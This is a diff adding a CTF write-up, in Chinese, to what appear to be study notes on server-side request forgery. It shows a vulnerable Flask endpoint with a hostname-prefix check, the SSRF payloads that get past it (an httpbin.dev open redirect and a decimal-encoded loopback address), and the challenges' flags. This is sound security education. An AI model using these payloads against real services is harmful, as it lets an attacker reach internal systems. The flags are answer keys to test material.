@@ -83,3 +83,26 @@ if __name__ == "__main__":
    http://2130706433/internal-only
    ```
 2. flag = `CTF{55rf_15_1n7r4n37_k1ll3r!}`
+
+---
+
+# SSRF2
+## 題目
+
+```js
+@app.route("/mkreq", methods=["GET"])
+def make_request():
+    url = request.args.get("url")
+    if not urlparse(url).hostname.startswith("httpbin.dev"):
+        return "badhacker"
+    return requests.get(url, verify=False).text
+```
+
+## 解題
+1. 條件相較於 [[#SSRF1]] ，變成指定要由 `httpbin.dev` 開始
+2. 輸入 `http://httpbin.dev` 進入網頁
+   ![[W4-7_httpbin_dev.png|533]]
+   往下滑尋找可以用的東西
+   ![[W4-7_httpbin_redirect.png|557]]
+3. 輸入 `http://httpbin.dev/redirect-to?url=http://127.0.0.1/internal-only`
+4. flag = `CTF{y0u_4r3_r34lly_4_55rf_0p3n_r3d1r3c7_m4573r}`
